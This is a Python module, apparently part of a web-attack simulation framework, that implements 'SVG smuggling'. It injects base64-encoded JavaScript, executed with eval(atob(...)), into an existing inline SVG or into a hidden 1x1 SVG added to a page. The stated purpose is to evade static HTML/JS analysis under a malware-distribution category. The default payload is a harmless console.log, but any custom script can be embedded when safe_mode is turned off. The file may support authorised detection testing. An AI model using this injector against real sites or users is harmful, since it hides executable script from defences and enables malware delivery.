from __future__ import annotations

import base64
import re
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
from app.utils.html_utils import parse_html, serialize_html


class SvgSmugglingTechnique(BaseTechnique):
    """
    T9 — SVG smuggling: JS hidden inside an SVG image.

    Finds the first <svg> element or an <img src="*.svg"> and injects a
    JavaScript payload encoded as base64 inside the SVG's <script> tag.
    The SVG renders as an image but executes JavaScript, bypassing static
    analysis that treats SVG as inert image content.
    """

    TECHNIQUE_ID: ClassVar[int] = 9
    TECHNIQUE_NAME: ClassVar[str] = "SVG Smuggling (Embedded JS)"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.VISUAL_MIMICRY
    CATEGORIES: ClassVar[list[Category]] = [Category.MALWARE_DISTRIBUTION]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_IMAGES]
    DESCRIPTION: ClassVar[str] = (
        "Embeds base64-encoded JavaScript inside an inline <svg> element. "
        "The SVG appears as a normal image but the script executes in the "
        "browser, evading static HTML/JS analysers."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="payload_js",
            description="JavaScript payload to embed inside the SVG",
            type=str,
            default="console.log('svg_smuggled_payload');",
        ),
        OptionSpec(
            name="encoding",
            description="Payload encoding: 'base64' or 'plain'",
            type=str,
            default="base64",
        ),
        OptionSpec(
            name="inline_img_svgs",
            description="If true, fetch <img src='*.svg'> and convert to inline carriers",
            type=bool,
            default=True,
        ),
        OptionSpec(
            name="safe_mode",
            description="If true, use the benign console.log payload (override any custom payload)",
            type=bool,
            default=True,
        ),
    ]

    @staticmethod
    def _payload_balanced(js: str) -> bool:
        """Reject payloads whose braces/quotes are obviously unbalanced — they
        will silently break the encoded eval at runtime."""
        if not js:
            return False
        pairs = {"{": "}", "[": "]", "(": ")"}
        stack: list[str] = []
        in_str: str | None = None
        i = 0
        while i < len(js):
            ch = js[i]
            if in_str:
                if ch == "\\":
                    i += 2; continue
                if ch == in_str:
                    in_str = None
            else:
                if ch in ("'", '"', "`"):
                    in_str = ch
                elif ch in pairs:
                    stack.append(pairs[ch])
                elif ch in pairs.values():
                    if not stack or stack.pop() != ch:
                        return False
            i += 1
        return not stack and in_str is None

    def _fetch_img_svgs(self, soup, base_url: str) -> int:
        """Replace <img src='*.svg'> with their inline content. Returns count."""
        from urllib.parse import urljoin
        from app.utils.image_utils import fetch_image_bytes
        from bs4 import BeautifulSoup
        converted = 0
        for img in list(soup.find_all("img", src=True)):
            src = img["src"]
            if not src.lower().endswith(".svg") or src.startswith("data:"):
                continue
            abs_src = urljoin(base_url, src)
            raw = fetch_image_bytes(abs_src)
            if not raw:
                continue
            try:
                text = raw.decode("utf-8", errors="ignore")
                frag = BeautifulSoup(text, "lxml")
                svg = frag.find("svg")
                if svg:
                    img.replace_with(svg)
                    converted += 1
            except Exception:
                continue
        return converted

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        safe_mode: bool = bool(options.get("safe_mode", True))
        payload_js: str = (
            "console.log('svg_smuggled_payload');"
            if safe_mode
            else options.get("payload_js", "console.log('svg_smuggled');")
        )
        encoding: str = options.get("encoding", "base64")
        inline_img_svgs: bool = bool(options.get("inline_img_svgs", True))

        if not self._payload_balanced(payload_js):
            self.log("warning", "svg_skip", reason="payload_unbalanced")
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "svg_smuggling_skipped", "Payload has unbalanced quotes/braces",
                    details={"reason": "payload_unbalanced"},
                )],
            )

        soup = parse_html(html)
        inline_svgs_before = len(soup.find_all("svg"))
        svgs_from_img = 0
        if inline_img_svgs:
            svgs_from_img = self._fetch_img_svgs(soup, url)

        inline_svgs = soup.find_all("svg")
        payload_bytes = len(payload_js.encode())

        if not inline_svgs:
            body = soup.find("body")
            if not body:
                self.log("warning", "svg_skip", reason="no_body")
                return ApplyResult(
                    modified_html=None, modified_url=None, extra_files={},
                    change_log=[self._make_change(
                        "svg_smuggling_skipped",
                        "No inline <svg> or <body> found to inject",
                        details={"reason": "no_body"},
                    )],
                )
            svg_tag = self._build_payload_svg(soup, payload_js, encoding)
            body.append(svg_tag)
            self.log("info", "svg_injected", carrier="hidden_1x1",
                     payload_bytes=payload_bytes, encoding=encoding)
            return ApplyResult(
                modified_html=serialize_html(soup),
                modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "svg_smuggling_injected",
                    "Injected hidden 1×1 SVG with embedded JS payload",
                    details={
                        "svgs_found_inline": inline_svgs_before,
                        "svgs_from_img": svgs_from_img,
                        "carrier": "hidden_1x1",
                        "payload_bytes": payload_bytes,
                        "encoding": encoding,
                    },
                )],
            )

        svg = inline_svgs[0]
        self._inject_into_svg(soup, svg, payload_js, encoding)
        self.log("info", "svg_injected", carrier="existing_inline",
                 payload_bytes=payload_bytes, encoding=encoding,
                 svgs_from_img=svgs_from_img)

        return ApplyResult(
            modified_html=serialize_html(soup),
            modified_url=None,
            extra_files={},
            change_log=[
                self._make_change(
                    "svg_smuggling",
                    f"Embedded {encoding}-encoded JS payload in first inline <svg>",
                    after=payload_js[:80],
                    details={
                        "svgs_found_inline": inline_svgs_before,
                        "svgs_from_img": svgs_from_img,
                        "carrier": "existing_inline",
                        "payload_bytes": payload_bytes,
                        "encoding": encoding,
                    },
                )
            ],
        )

    def _build_encoded_script(self, js: str, encoding: str) -> str:
        if encoding == "base64":
            b64 = base64.b64encode(js.encode()).decode()
            return f"eval(atob('{b64}'))"
        return js

    def _inject_into_svg(self, soup, svg_tag, js: str, encoding: str) -> None:
        script_content = self._build_encoded_script(js, encoding)
        script = soup.new_tag("script")
        script["type"] = "text/javascript"
        script.string = f"//<![CDATA[\n{script_content}\n//]]>"
        svg_tag.append(script)

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        has_svg = html and "<svg" in html.lower()
        if has_svg:
            signals.append("HTML has inline <svg> element")
        else:
            issues.append("No inline <svg> element found in HTML")

        has_script_in_svg = False
        if html:
            from app.utils.html_utils import parse_html
            soup = parse_html(html)
            for svg in soup.find_all("svg"):
                if svg.find("script"):
                    has_script_in_svg = True
                    break
        if has_script_in_svg:
            signals.append("SVG element contains <script> tag")
        else:
            issues.append("No <script> tag found inside SVG")

        if html and ("atob(" in html or "eval(" in html):
            signals.append("HTML contains atob()/eval() — base64 payload execution")
        else:
            issues.append("HTML missing atob()/eval() — payload may not be encoded")

        entry = next(
            (e for e in change_log if e.change_type in ("svg_smuggling", "svg_smuggling_injected")), None
        )
        if entry:
            pb = entry.details.get("payload_bytes", 0)
            signals.append(f"change_log: payload_bytes={pb}")
        else:
            issues.append("No svg_smuggling entry in change_log")

        passed = bool(has_svg and has_script_in_svg)
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"has_svg": has_svg, "has_script_in_svg": has_script_in_svg},
        )

    def _build_payload_svg(self, soup, js: str, encoding: str):
        script_content = self._build_encoded_script(js, encoding)
        svg_str = (
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'width="1" height="1" style="position:absolute;opacity:0;">'
            f"<script type=\"text/javascript\">//<![CDATA[\n{script_content}\n//]]></script>"
            f"</svg>"
        )
        from bs4 import BeautifulSoup
        frag = BeautifulSoup(svg_str, "lxml")
        return frag.find("svg")
